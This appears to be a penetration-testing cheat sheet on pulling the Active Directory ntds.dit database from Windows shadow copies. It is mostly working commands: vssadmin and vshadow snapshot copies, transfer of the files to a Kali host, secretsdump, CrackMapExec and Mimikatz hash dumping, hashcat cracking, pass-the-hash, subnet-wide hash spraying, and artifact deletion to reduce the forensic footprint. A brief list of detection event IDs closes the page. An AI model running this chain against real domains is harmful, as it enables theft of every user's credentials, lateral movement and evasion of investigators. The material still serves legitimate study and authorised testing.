# Shadow Copies — NTDS.dit Extraction

Volume Shadow Copy Service (VSS) is a Windows feature that creates point-in-time snapshots of volumes while they are in use. From an attacker's perspective, shadow copies are valuable because they allow access to files that are normally locked by the OS — most importantly `ntds.dit`, the Active Directory database that contains every domain user's password hash.

> Requires local administrator or Domain Admin privileges on the Domain Controller.

---

## Why NTDS.dit

The file `C:\Windows\NTDS\ntds.dit` is the Active Directory database. It stores:

- NTLM hashes for every domain user
- Kerberos keys
- Password history
- Group membership

The OS keeps it locked at all times — shadow copies bypass this lock entirely.

---

## Method 1 — vshadow.exe (Manual)

### Step 1 — Create a Shadow Copy of the C Drive

```cmd
vshadow.exe -nw -p C:
```

Note the shadow copy device path from the output — it looks like:
`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`

### Step 2 — Copy NTDS.dit from the Shadow Copy

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\ntds.dit.bak
```

### Step 3 — Save the SYSTEM Hive

The SYSTEM registry hive contains the boot key needed to decrypt NTDS.dit.

```cmd
reg.exe save hklm\system C:\system.bak
```

### Step 4 — Transfer Files to Kali

Use any method from your file transfer notes. Quick options:

```bash
# From Kali — pull via SMB if you have creds
smbclient //<target_ip>/C$ -U "<domain>\<username>" -c "get ntds.dit.bak; get system.bak"

# Or set up a Python HTTP server on the victim and wget from Kali
# Victim (PowerShell):
python3 -m http.server 8080

# Kali:
wget http://<victim_ip>:8080/ntds.dit.bak
wget http://<victim_ip>:8080/system.bak
```

### Step 5 — Extract Hashes on Kali

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## Method 2 — impacket-secretsdump (Remote, No File Transfer)

If you have Domain Admin credentials, skip the manual steps entirely and dump remotely:

```bash
# With cleartext credentials
impacket-secretsdump <domain>/<username>:<password>@<dc_ip>

# Pass-the-Hash
impacket-secretsdump -hashes <LM>:<NT> <domain>/<username>@<dc_ip>

# Extract only a specific user's hash
impacket-secretsdump -just-dc-user <target_username> <domain>/<username>:<password>@<dc_ip>

# Save output to file
impacket-secretsdump <domain>/<username>:<password>@<dc_ip> -outputfile hashes
```

---

## Method 3 — vssadmin (Built-in Windows)

No external tools needed — vssadmin is available on all Windows Server versions.

```cmd
# List existing shadow copies
vssadmin list shadows

# Create a new shadow copy
vssadmin create shadow /for=C:

# Access the shadow copy — replace X with the shadow copy number
mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX

# Copy NTDS.dit from the mounted shadow copy
copy C:\ShadowCopy\Windows\NTDS\ntds.dit C:\ntds.dit.bak

# Save SYSTEM hive
reg save hklm\system C:\system.bak

# Clean up the symlink after use
rmdir C:\ShadowCopy
```

---

## Method 4 — CrackMapExec (One-liner)

```bash
# Dump NTDS.dit directly via CME — handles shadow copy creation internally
crackmapexec smb <dc_ip> -u <username> -p <password> --ntds

# Pass-the-Hash
crackmapexec smb <dc_ip> -u <username> -H <NT_hash> --ntds

# VSS method explicitly
crackmapexec smb <dc_ip> -u <username> -p <password> --ntds vss
```

---

## Method 5 — Mimikatz (If You Can't Transfer Files)

When you can't exfiltrate files to Kali, use Mimikatz directly on the DC:

```powershell
mimikatz # lsadump::ntds /ntds:"C:\ntds.dit.bak" /system:"C:\system.bak"

# Or dump directly from the running DC without shadow copies (noisier)
mimikatz # lsadump::dcsync /domain:<domain> /all /csv
```

---

## Working With the Extracted Hashes

### Output Format

`impacket-secretsdump` returns hashes in this format:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<username>:<RID>:<LM_hash>:<NT_hash>:::
```

The NT hash (last field before `:::`) is what you need.

### Crack with Hashcat

```bash
# Extract just the NT hashes
cut -d: -f4 hashes.ntds > nt_hashes.txt

# Crack with hashcat (mode 1000 = NTLM)
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Pass-the-Hash with Extracted Hashes

```bash
# No cracking needed — use the NT hash directly
crackmapexec smb <target> -u Administrator -H <NT_hash>

# Evil-WinRM
evil-winrm -i <target_ip> -u Administrator -H <NT_hash>

# Impacket psexec
impacket-psexec <domain>/Administrator@<target_ip> -hashes :<NT_hash>
```

### Check for Reused Passwords Across Hosts

```bash
# Spray the extracted NT hashes across the network
crackmapexec smb <subnet>/24 -u Administrator -H <NT_hash> --local-auth
```

---

## Cleanup

Remove artifacts from the DC to reduce forensic footprint:

```cmd
del C:\ntds.dit.bak
del C:\system.bak
vssadmin delete shadows /shadow:<shadow_id> /quiet
```

---

## Detection Notes

- Event ID 7036 — VSS service started (unusual if not during backup window)
- Event ID 8222 — Shadow copy created outside scheduled backup
- Event ID 4656 / 4663 — NTDS.dit file access
- LSASS access and `reg save` commands are high-confidence indicators
- Monitor for `ntds.dit` copies outside `C:\Windows\NTDS\`